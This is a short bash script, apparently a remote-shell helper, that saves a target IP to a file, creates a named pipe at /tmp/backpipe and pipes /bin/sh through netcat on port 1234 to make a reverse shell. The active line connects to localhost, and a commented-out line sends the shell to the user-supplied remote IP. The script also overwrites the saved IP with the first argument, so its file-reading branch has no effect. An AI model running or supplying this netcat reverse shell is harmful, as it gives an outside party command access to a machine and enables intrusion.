#!/bin/bash
#
# Usage Example:  ./target.sh localhost
#
 if [ "$#" -eq  "0" ]
   then
     rip=`cat server.txt`
 else
     #read rip
     rip=$1
     echo "$rip" > server.txt
 fi

echo "Server IP: $rip" 
echo ""
echo "Starting Up Remote Shell Server, You Will Need Permission...."
port="1234"
rip="$1"
rm /tmp/backpipe
echo ""
mknod /tmp/backpipe p
#/bin/sh 0</tmp/backpipe | nc "$rip" 1234 1>/tmp/backpipe
/bin/sh 0</tmp/backpipe | nc localhost $port 1>/tmp/backpipe
# /bin/sh 0</tmp/backpipe | nc localhost 1234 1>/tmp/backpipe
